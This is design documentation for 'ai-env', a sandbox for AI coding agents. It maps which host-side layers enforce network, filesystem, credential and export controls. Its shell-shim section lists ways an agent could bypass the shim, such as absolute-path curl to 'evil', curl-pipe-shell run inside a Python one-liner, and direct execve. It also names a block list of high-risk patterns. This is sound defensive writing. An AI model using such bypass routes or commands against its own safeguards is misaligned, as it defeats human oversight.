# Enforcement boundaries

This document is the honest map of which `ai-env` control enforces which part
of the threat model, and at which layer of the stack. Two questions it
answers directly:

1. If `ai-env` blocked an action, which package made the decision and which
   layer made the decision stick?
2. If `ai-env` did not block an action, which other control was supposed to
   stop it and why?

Read this together with [`threat-model.md`](threat-model.md) (what the tool
is defending against) and [`residual-risk.md`](residual-risk.md) (what it
deliberately does not defend against).

## The cardinal rule

> System prompts and agent instructions are not the security boundary. The
> security boundary is the layer below the agent: the sandbox kernel, the
> backend's network stack, the host-side broker, and the filesystem the
> agent was launched against.

Every entry in this document either points at a runtime control the agent
cannot disable from inside the sandbox, or explicitly flags itself as a
cooperative control that an uncooperative agent can bypass.

## Layered enforcement table

The table summarises every enforcement layer in v0.1. The "Bypassable from
inside the sandbox?" column is the most important one for the threat model:
a "yes" means the layer is defense-in-depth, not the primary boundary.

| Layer                        | Enforces                                                                  | Owning package(s)                                            | Bypassable from inside the sandbox?                                                                |
|------------------------------|---------------------------------------------------------------------------|--------------------------------------------------------------|---------------------------------------------------------------------------------------------------|
| Workspace strategy           | Active working tree is invisible to the agent                             | `internal/workspace/`                                        | No: the agent's filesystem root is materialized before launch and contains only the worktree/copy. |
| Sandbox backend (primary)    | Host filesystem, host network, host process tree, host Docker socket      | `internal/backend/docker_sbx/`                               | No (microVM isolation). A backend bug is the residual risk.                                       |
| Sandbox backend (fallback)   | Host filesystem, host network, host Docker socket; reduced kernel isolation | `internal/backend/docker/`, `internal/backend/podman/`     | Partially: shares host kernel. Requires `--accept-reduced-isolation`.                              |
| Network egress policy        | Outbound destinations from the sandbox                                    | `internal/network/`, per-backend `network_adapter.go`        | No when the adapter installed the policy; supervisor refuses to start on `failed_policy`.          |
| Provider credential proxy    | Anthropic / OpenAI API keys                                               | `internal/secrets/proxy.go`                                  | Partially: agent can use the proxy URL but never sees the token. Proxy pins one upstream host.    |
| GitHub broker                | Push, PR-create, token lifetime                                           | `internal/githubbroker/`                                     | No: broker runs on the host. The agent has no Git credentials inside the sandbox.                  |
| Export gate                  | What leaves the sandbox via `ai-env patch` / `ai-env pr`                  | `internal/export/gate.go`                                    | No: runs on the host before any export.                                                            |
| Built-in secret scanner      | Detects pattern-matched secrets in the diff                               | `internal/scanners/builtin.go`                               | No: runs on the host on the post-run workspace.                                                    |
| Policy engine                | Records and routes decisions across the surfaces above                    | `internal/policy/policy.go`                                  | No: runs on the host. The engine is consulted; it does not depend on agent cooperation.            |
| Shell shim (optional)        | Shell commands the agent issues through `ai-env shell` or `--shell-shim` | `internal/policy/shim.go`                                    | **Yes, partially** (see "Shell shim limitations" below).                                           |

## What each layer actually does

### Workspace strategy — `internal/workspace/`

For a Git source, `ai-env new <env>` creates a branch `ai-env/<env>` and a
worktree at `.ai-env/workspaces/<env>/`. For a non-Git source, the
materializer copies the source into the same path and snapshots a baseline
at `.ai-env/baselines/<env>/`. The sandbox is launched with the workspace
path as its visible filesystem root. The agent has no view of the source
repository's `.git/` directory in worktree mode beyond what the worktree
itself exposes; it has no view of any other branch.

Protected paths (`internal/workspace/protected.go`,
`DefaultProtectedPaths`) flag changes to `.github/workflows/**`, `.env`,
dependency lockfiles, `Dockerfile`, `terraform/**`, `migrations/**`, and
`.ai-env/**` so the export gate can refuse to ship them. The matcher does
not prevent the agent from writing those files inside the workspace; it
prevents the change from leaving the workspace.

### Sandbox backend — `internal/backend/`

Three adapters land in v0.1:

- `internal/backend/docker_sbx/` is the primary adapter. It targets a
  Docker-Sandboxes-compatible runtime (microVM-backed). This is the only
  adapter the threat model considers a real kernel boundary.
- `internal/backend/docker/` is the rootless Docker fallback. It shares the
  host kernel.
- `internal/backend/podman/` is the rootless Podman fallback. It shares the
  host kernel.

Both fallbacks gate autonomous mode behind
`Options.AcceptReducedIsolation=true`. Both default to `--network none` and
refuse a network policy that requires an allowlist unless
`Options.UnsafeHostNetwork=true` is also set. The `ReducedIsolationWarning`
text is printed by the adapter on `Detect`; the supervisor wires that writer
to stderr. The verbatim warning lives in `internal/backend/docker/docker.go`
and `internal/backend/podman/podman.go`.

The primary adapter does not mount the host Docker socket, the SSH agent
socket, or `$HOME`. Those are not "blocked at the firewall"; they are simply
not in the mount set the adapter passes to the runtime.

### Network egress policy — `internal/network/` and per-backend adapter

`NewNetworkPolicy` in `internal/network/network.go` forces four block flags
on regardless of `policy.yaml`:

- `BlockPrivateRanges` (10/8, 172.16/12, 192.168/16).
- `BlockMetadataServices` (169.254.169.254/32).
- `BlockLocalhost` (127.0.0.0/8 and the literal `localhost` hostname).
- `BlockHostDockerInternal` (the literal `host.docker.internal` hostname).

`NetworkPolicy.Validate("autonomous")` rejects `default: allow`. The runtime
default is `deny`; the operator's `allow_domains` list widens it. The
supervisor calls `NetworkPolicyAdapter.Apply` before launching the agent; on
failure the run terminates with state `StateFailedPolicy` and reason
`failed_policy`. The agent is never started when the policy did not apply.

Every observed network event (per backend's capability) is appended to
`network-events.jsonl`; `ai-env report` summarises the allowed and denied
totals.

### Provider credential proxy — `internal/secrets/proxy.go`

The proxy binds to 127.0.0.1 on the host with an OS-chosen port and is
exposed inside the sandbox via `ANTHROPIC_BASE_URL` / `OPENAI_BASE_URL`. The
proxy:

- Is a plain HTTP server (no TLS MITM); upstream traffic is HTTPS.
- Pins a single upstream host. A request whose `Host` header / URL targets a
  different host returns HTTP 502.
- Injects the provider's auth header on the host side from the configured
  credential. The token is in the proxy process's memory, not in the
  sandbox.
- Runs `RedactSecrets` over every log line. Tokens that leak into upstream
  error bodies are replaced with `REDACTED`.

The agent inside the sandbox can call the proxy. It cannot read the token,
cannot point the proxy at a different upstream, and cannot read the proxy's
logs (those live on the host filesystem).

### GitHub broker — `internal/githubbroker/`

The broker is the host-side path that opens draft PRs. It runs the lifecycle
the master plan pins (`Prepare`, `AcquireToken`, `PushBranch`,
`ScanMetadata`, `CreateDraftPR`, `RevokeToken`) and refuses to proceed when
any stage fails the policy check. Specifically:

- Branch prefix is enforced at `Prepare` (`internal/githubbroker/validate.go`).
- Protected branches (main / master / configured list) are rejected at
  `Prepare`.
- Path gate rejects branches whose diff touches `.github/workflows/**`,
  `.ai-env/**`, or the operator's configured `block_paths`.
- `ScanMetadata` runs the built-in secret scanner over PR title, body,
  branch name, and commit messages; a high-confidence finding blocks PR
  creation.
- The token never crosses the sandbox boundary. `TokenHolder` clamps TTL,
  serialises revoke, and never logs the secret.
- Every stage outcome is appended to `policy-decisions.jsonl` so the
  audit trail records "what the broker decided, and why".

### Export gate — `internal/export/gate.go`

`ai-env patch` and `ai-env pr` consult the gate. The hard blockers (cannot
be overridden by `policy.yaml`) are:

- `secret_finding` (built-in scanner high-confidence match).
- `external_secret_finding` (gitleaks / external scanner match).
- `ai_env_change` (any path under `.ai-env/`).
- `policy_change` (any change to `policy.yaml`).
- `quarantine` (the run is in `StateQuarantined`).
- Under `ModePR`: `.github/workflows/**` changes.

The configurable blockers (overridable by `policy.yaml`) are large diff
size, new binary files, new executable files, lockfile changes, and
protected-path warnings. Entropy-only secret findings warn but never block.

### Policy engine — `internal/policy/policy.go`

The engine is the single decision point every enforcement surface above
consults when it wants the decision recorded in `policy-decisions.jsonl`. It
is a pure evaluator: no I/O, no logging inside `Evaluate`. It fails closed
on unknown event types and on unparseable policy.yaml. It is the surface
`ai-env policy explain` reads decisions back from.

The engine does not, by itself, intercept anything. The enforcement always
lives in the surface that calls `Evaluate` (the broker, the export gate,
the network adapter, the shell shim).

### Shell shim — `internal/policy/shim.go` (opt-in via `--shell-shim`)

When `ai-env run` is launched with `--shell-shim`, the supervisor places the
shim binary in front of `bash` and `sh` on the agent's `PATH`. The shim:

- Evaluates each command against the policy engine
  (`EventShellCommand`).
- Hard-denies the `HighRiskShellPatterns` list (curl-pipe-shell, SSH key
  paths, cloud metadata IP) regardless of `policy.yaml`.
- Appends every attempt to `shell-commands.jsonl`.
- Forwards allowed commands to the real binary on PATH (with a recursion
  guard so the shim never invokes itself).

## Shell shim limitations (read this twice)

The shim is **cooperative** in exactly the same sense the master plan
documents: it intercepts what an agent runs through a shell wrapper, and
nothing else. Specifically the shim cannot stop an agent that:

- **Invokes an absolute path.** `/usr/bin/curl http://evil/` bypasses the
  shim entirely. Filesystem isolation and the network policy remain the
  real boundary for this case.
- **Calls a static binary the shim does not wrap.** The shim wraps `bash`
  and `sh`. Static binaries the agent ships with itself do not pass through
  it.
- **Executes code inside an interpreter.** `python -c "import os;
  os.system('curl ... | sh')"` is one command to the shim. The shim cannot
  see the inner statements; the inner shell invocation is what the network
  policy and the backend isolation must catch.
- **Uses a syscall-level execve()** rather than a shell. The shim is
  PATH-resolution-based; a process that directly execve()s `/usr/bin/curl`
  is not intercepted.

This is why the shim is opt-in and labelled "prototype" in the source. It
exists to surface obviously hostile commands and to produce an audit trail,
not to be the primary defense against an agent that wants to run a specific
binary.

The real boundary for shell command behaviour is the layer below the shell:
the network policy decides what the curl call can reach, the filesystem
isolation decides what the cat call can read, and the backend isolation
decides what the host can see.

## Preventive vs detective controls

| Control                                         | Type                  | Notes                                                                                          |
|-------------------------------------------------|----------------------|------------------------------------------------------------------------------------------------|
| Workspace isolation                             | Preventive            | The agent cannot see what is not mounted.                                                       |
| Backend mount set (no SSH, no Docker socket)    | Preventive            | Same: not mounted, not reachable.                                                               |
| Network deny-by-default                         | Preventive            | Backend-enforced when the adapter installs it; fail-closed on install failure.                  |
| Always-blocked CIDRs / hosts                    | Preventive            | Forced on; not overridable from `policy.yaml`.                                                  |
| GitHub broker path gate                         | Preventive            | Blocks the push before the credential is materialized into git transport.                       |
| Provider proxy auth injection                   | Preventive            | The token is on the host; the sandbox sees the proxy URL.                                       |
| Shell shim high-risk patterns                   | Preventive (cooperative) | Only catches commands routed through the shim; see limitations.                              |
| Protected-path matcher                          | Detective + gating    | Flags changes in the diff; export gate consumes the flags.                                      |
| Built-in secret scanner                         | Detective + gating    | Pattern-only matches block export at high confidence.                                           |
| Entropy analyzer                                | Detective (warn-only) | Warn, do not block, to avoid blocking on UUIDs and checksums.                                   |
| `policy-decisions.jsonl` / `network-events.jsonl` / `shell-commands.jsonl` | Forensic | Recorded for every run; never consulted to make new decisions in v0.1.        |
| `ai-env report`, `ai-env logs`, `ai-env trace`  | Forensic              | Surface the JSONL trail for an operator after the run.                                          |

## Fail-closed boundaries

The following failures terminate the run before the agent gets a chance to
do anything:

- Unparseable `policy.yaml` → `ai-env run` exits non-zero before launch.
- `NetworkPolicyAdapter.Apply` returns an error → state `StateFailedPolicy`,
  agent not started.
- Backend `Detect` reports unavailable in autonomous mode without the
  required `--accept-reduced-isolation` → run aborts with the reduced-
  isolation message.
- Unknown `sbx` CLI version → `internal/backend/docker_sbx/compat.go`
  refuses to launch.
- Missing agent binary or unsatisfied version constraint → agent launcher
  refuses to launch.

Once the run is in flight, the following failures terminate it without
exporting:

- Quarantine decision from any policy event → state `StateQuarantined`;
  export gate refuses both patch and PR.
- Supervisor timeout (max-runtime or idle) → state `StateTimedOut` or
  `StateKilledIdle`; partial diff and logs are still preserved.
- Backend reports a fatal error → state `StateFailedBackend`.
- Scanner crash that blocks the gate from running → export refused.
